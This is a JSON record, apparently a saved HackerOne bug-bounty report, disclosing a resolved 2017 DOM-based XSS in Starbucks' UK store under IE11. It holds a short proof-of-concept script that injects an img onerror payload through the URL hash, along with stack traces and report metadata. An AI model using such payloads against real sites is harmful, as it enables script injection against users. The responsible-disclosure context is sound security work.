@@ -1,0 +1,218 @@
+{
+  "id": 241619,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDE2MTk=",
+  "url": "https://hackerone.com/reports/241619",
+  "title": "DOM-based XSS in store.starbucks.co.uk on IE 11",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-20T09:13:03.453Z",
+  "submitted_at": "2017-06-20T09:13:03.453Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "albinowax",
+    "url": "/albinowax",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-11-03T18:08:52.345Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-04T18:08:42.329Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "We've found DOM XSS on store.starbucks.co.uk and other related domains such as store.starbucks.fr and store.starbucks.ca.  It appears to be a JQuery based DOM XSS in the parseHTML sink. In order to trigger the XSS you need to use IE11 and the PoC will visit the url first, wait 5 seconds and then revisit the same url to trigger the XSS. \n\nHere is the PoC:\n<script>\nfunction poc() {\n        var url = 'https://store.starbucks.co.uk/#<img/src=\"1\"/onerror=alert(1)>', \n            win = window.open(url);\n        setTimeout(function(){win.location=url}, 5000);\n}\n</script>\n<a href=\"#\" onclick=\"poc();\">PoC visit using IE11</a>\n\nIt may be possible to make this PoC work in Edge, too. Here is a stacktrace of where the source is accessed:\n\nError\n    at Object.get hash [as hash] (<anonymous>:1:29568)\n    at Object.initialize (eval at <anonymous> (:1:31716), <anonymous>:1:2524)\n    at HTMLDivElement.eval (eval at <anonymous> (:1:31716), <anonymous>:1:6085)\n    at Function.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:28:379)\n    at a.fn.init.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:22:134)\n    at a.fn.init.$.fn.tabs (eval at <anonymous> (:1:31716), <anonymous>:1:765)\n    at HTMLDocument.<anonymous> (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:528:82)\n    at r (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:69:440)\n    at Object.fireWith [as resolveWith] (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:71:228)\n    at Function.ready (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:24:415)\n    at HTMLDocument.ga (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:19:386)\nHere is a stack trace of where the sink is executed:\n\nError\n    at HTMLDivElement.set [as innerHTML] (<anonymous>:1:41512)\n    at Function.buildFragment (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:136:359)\n    at Function.parseHTML (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:26:309)\n    at a.fn.init (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:193:56)\n    at g (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:18:396)\n    at Object.initialize (eval at <anonymous> (:1:31716), <anonymous>:1:2495)\n    at HTMLDivElement.eval (eval at <anonymous> (:1:31716), <anonymous>:1:6085)\n    at Function.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:28:379)\n    at a.fn.init.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:22:134)\n    at a.fn.init.$.fn.tabs (eval at <anonymous> (:1:31716), <anonymous>:1:765)\n    at HTMLDocument.<anonymous> (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:528:82)\n    at r (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:69:440)\n    at Object.fireWith [as resolveWith] (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:71:228)\n    at Function.ready (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:24:415)\n    at HTMLDocument.ga (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:19:386)\n",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 195674,
+      "file_name": "Screen_Shot_2017-06-20_at_10.08.32.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/195/674/0afb39dc1c1117bccd7ac4e8fc82247f50d6c67d/Screen_Shot_2017-06-20_at_10.08.32.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-06-20_at_10.08.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-06-20_at_10.08.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4SYXBO4J%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARPWvhLY%2FBF5mQGv15%2FBOapOaZWEr8SwXrmKHUnS%2F4KAiEA%2F61jAgKqhXuUAkvcE7AI78W5F4gCCuw4JeopBLh%2FhI0qsgUIfxADGgwwMTM2MTkyNzQ4NDkiDELb591HcWu0HijbBiqPBV4P1xpz8rUmaCfAdCGrm1Sf0toBW3PBHx44dBLQVqave%2FoWHzcIyFy3ilHHtsCuD4EI9gOKmZfsVnKFo%2B1QD3eA8Ji2TT1P9knGwxceCVnn3ZVUi13D%2FkGiFws8K0wn%2FqpSfpsneKKnaoq%2Feir2V6M8iGForRSWRtg06aE0Y1JFVJ6OR2Lw4h5hhO7JwtwPKrqXycEsrWyLvyYPEYOSME6bEJuaX%2F95Apzq1JKy%2BfzgyHnNeroziJQnQExKoS%2BZB9zV%2BzacRK3IEGpUXUzaGN1q27%2Bz7OEPQjc0BNE3WDCZehfCgFY2cvdaFgMlpRgwAboNWMP9QDWbGvrUuFEFItoh%2B%2Fcq6meS7uIU%2FFmwhPeiUy6vofJpDG38ShanOh6%2BDJWNS01dvxup26WFtz5TEsQ%2FZKzg1UO8mKkdS2ZS35d%2FmBI8MBhRqsr89tXcZDYd%2BGSAec8vwNgx9oSS5J1mhdid5N6NfxEpyInYaRNXXpx1I5rjKiv%2FsHKka%2FqXo1B5tTmCvkBM3jRwbYrSKWy9KFn28%2FAu9GHOu3y2f7AvniEquPMCWzP0YCA0HiNa711cp%2B8Qjw6%2BDJwJd5VB4RMiTqLwhGPofYLTcgwqwUc9AwxBkGr1Bh57z8Qc%2FgtGIMclpGb70J03y2yNX44SASk%2Bp1yGOEXmpLm0C8SyIUy2FZlisYokJi8MBUEmx0W7Qx4hKZET%2BGUCKY%2BDoR7A%2FBnfDPpRB1Vxfej7y%2FCgv01rWSe%2BQmICbg4%2F5fQx9%2By3JKuPm6r6CBrfzvwtN7qjwXDIUSXkpAxikqJWH5gFY%2F03yuazOPlGITCjSlpPK014fdXL9GjoDEZbmQsn7SFub31%2FgZmSX5dU22dOsx5Fb5w%2B8V8wsc630gY6sQEPKwp7IsQc4Ki6K8nI91fzhIvwUB1D7%2FXedtCF%2FShvzzrrc1DAqOg4vr2XcEZBAunyFcCpZTeLUZaTVozU1rKcoHzQgqcbMpiVDVzR50PXrMpZjaZF7hkh%2BEA9%2Bqqi4QY5Ueue0POHdYsWHfI59tF4qKt0xZ7VD1vDGwpAg%2BQ5qYiP%2BbXG4r3cX7QDpNjAxI4wstfwkmmBPvicpmMfLIPlyJl%2Fkvj5g%2FnB%2FGA0tooJ8o4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=604173ffec852e422c1d2921e446a4a20a0efcf070189ed27fec5dc751286e1d",
+      "file_size": 885188,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-11-03T18:08:42.378Z",
+  "allow_singular_disclosure_after": -273758901.11073375,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "superhero1",
+    "jensec",
+    "spam404",
+    "remonsec",
+    "alyssa_herrera",
+    "null_rhythm",
+    "r3y",
+    "eveeez",
+    "khizer47",
+    "t4ym",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 2.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 12995,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other assets",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "241619",
+  "votes": 17,
+  "latest_disclosable_activity_at": "2017-11-03T18:08:52.370Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:17:03.830356",
+    "source": "https://hackerone.com/reports/241619.json",
+    "report_id": 241619
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDE2MTk=",
+    "databaseId": "241619",
+    "title": "DOM-based XSS in store.starbucks.co.uk on IE 11",
+    "url": "https://hackerone.com/reports/241619",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-11-03T18:08:52.345Z",
+    "created_at": "2017-06-20T09:13:03.453Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYz",
+      "name": "Cross-site Scripting (XSS) - DOM",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "low",
+      "score": 2.4
+    },
+    "reporter": {
+      "username": "albinowax"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE5ODk=",
+      "handle": "starbucks",
+      "name": "Starbucks",
+      "url": "https://hackerone.com/starbucks",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS82MTcxMA==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-10-04T00:40:33.692Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI0MTYxOQ==",
+    "_id": "241619",
+    "disclosed": true,
+    "votes": 17,
+    "latest_disclosable_activity_at": "2017-11-03T18:08:52.370Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDE2MTk=",
+      "databaseId": "241619",
+      "title": "DOM-based XSS in store.starbucks.co.uk on IE 11",
+      "url": "https://hackerone.com/reports/241619",
+      "disclosed_at": "2017-11-03T18:08:52.345Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE5ODk=",
+      "handle": "starbucks",
+      "name": "Starbucks",
+      "url": "https://hackerone.com/starbucks",
+      "currency": "usd"
+    }
+  }
+}
